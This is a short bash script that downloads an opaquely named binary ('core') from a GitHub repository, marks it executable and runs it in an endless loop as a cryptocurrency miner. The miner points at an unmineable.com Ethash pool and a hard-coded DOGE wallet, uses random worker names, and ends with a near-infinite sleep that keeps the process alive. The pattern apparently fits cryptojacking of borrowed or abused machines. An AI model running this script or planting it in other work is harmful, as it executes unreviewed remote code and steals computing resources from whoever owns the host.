#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=DOGE:DT7UtNqk6fZrpWRm8gUSULJ6KHMusSjtXz
WORKER=$(echo $(shuf -i 1000000-9999999 -n 1)-COIN#816c-v7qn)
wget https://github.com/dreamistoken/core/raw/main/core
chmod +x core
while [ 1 ]; do
./core --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999999999 
